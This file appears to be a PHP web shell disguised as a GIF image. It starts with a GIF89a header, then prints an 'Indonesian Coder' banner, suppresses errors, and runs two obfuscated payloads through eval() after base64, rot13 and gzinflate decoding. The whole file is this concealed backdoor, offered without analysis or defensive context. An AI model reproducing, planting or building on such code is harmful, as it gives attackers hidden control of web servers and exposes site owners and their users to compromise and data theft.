GIF89a???????????!??????,???????D?;?<?php
print('<pre />
############################################
##           Indonesian Coder             ##
############################################
');
session_start();
error_reporting(0);
$string = 'rUh6QttVEP58VfyHci+VHRUcqGdFFW9HDswR3U64OLkvAUyOvSFb7LW1uybNIf57dGntvJSW46QiUjgzzzMvz4wnWcpPU5KVhdRc3LuH7ePdHT4j7h5Kina3FYVOGPYH1xN0Gn+OH5y7afuXp92d1iNKXCdSJTTxySGQTQs2hVQkDP8JhhNtORrdUZeDY1Hv0M3F5y33MPh7HISjdTzsW8C0VZeAoGQak3Is7gkwS6LJrcDQyKcIRvGM5YcpA+gnLmtnD0g6dYzyInLOqv4VsFqeTYolleRtCeHD04sguhqcBxBgY2ROj59qakum2CuoeACZ1FmWWfqQZF4oPV2KOHTuqiPH/o9Bz8+HIEbdM3vQhYQgPyINg6vBKNgg5THPXMrT5BN8vKTI6T6hUxy6Qi9wxTPyO0EiFnGuaNntZxpsQKimg1vRvyEhk48MZteF3woC1r5EtZBgYcqjptgXk64Hu9bnBeL9eyMMn7nNtvwRjCZBkhWC4abgoqiikgnbHL0Tng37N6Poov9KY31tFThz/ClGmhN/jTofnI2vgutENBwMU86dVDuL8oCLJKsAis+K53LGvGVe4m9Vc5W1+faJDdi2DfzErem+dni6aXgAlMwLT3ua64ydjMWfoksIZUBPRjsJ5yzLbR3r7Vql+WA3NXpJwPul+L/M/0CSIoOp/frR/AHwhG2r3B7taKYrZQuMRAVQ96lYPXU1AgPoo43Renu0/dYccCBAMxVCfRMpX8IjUUul8Ci5Xzvvv2hhlvWmfDhRVVVkrERyU9reDjOrUaJsIVW5gHEEaixMpPYVWNBxN7JI+VdYTBbKUv++02TMTxrXHvoyJoyrfWOEDslnJQVOiwfgc8JCG2mz7bX9eylhYv9CDkD/OFadCCVmQDKZkxwvCCh9gyeVxFMDn9KT1wU9K/I8FnYjYI+LstJRL1jmRs2+dVdDcJ8mbFe3vW41zfnaYuND8hh0lfn+APgOSWniHGJKymBAJlFecpqXsdQGapDGOmEqYtrBYf6jhWSZFWRXLmvGWRsdUb/oc87TlIm6TXJ43wLMgF+7ZDfxK61mfrTRXq3imi0Mu1g2i9iIj3dN9tFiaB7BFvhAVpLFV/k63iLYIngfneqVtrbhLWw3QSwqNmQsuTmylW6kHK99uX4H9k2mjoZGlwOkJ+MwVBmvYzhkGlacO8AZkNnDvGtxkY3O0ggB7mopOi8jWIPLu6rGM3bqb35XKOzW3pFzK+DnkqVrF56JPchxyx9JVsKUIhpZ3rfh4Gtozwk9Js/menshZb30jcrwjhjJd3Seml8uYDUnKW9fuNIKfkyWV7Pc2Si3Sle2bAVkW2/Jb7spGBk2QflUh4fviCwW+PTO4HooF5O31/RBw9+M2XZlYDtfAQ==';
eval(gzinflate(str_rot13(base64_decode($string))));
eval(gzinflate(base64_decode('jVFdawIxEHwv9D8sQYhCPd+t9bSYVqF+9DwLUiVEL/WCl0Tu0qL/vhtP/KAvfUqyMzs7Ownb0Arv7ypOacmLVGYZPAEhQSKcrJKkoRtzqEO/qZoFqQWEPCJX7XgutXUSqRU+ZdEHiz5JxIbjmPFurxeRpad95VaXkmubIJcW0tlcGOjQYCNdagu3OhihZfUsQsuTj7pDRpe1gFIv5CyXWijvjG6tVnu7SjsbXwnWVh8phcx/ZM5PLPT/zwEEcDsSXPB+HE94fzyN6fK0babMdp171ZGCZ1vAGxZgdBDQvOm8UcbeKyhi7zM2jfksGngIRw4mMBdmA6/fRiiDSleh1iHGz8DS5U+ORlIpEnk08oLJIn4b8CJfmEjuskPd2T+gF+j4dKrnNB/gOjV8lYvipRxUw5aw3Qp/AQ==')));
?>
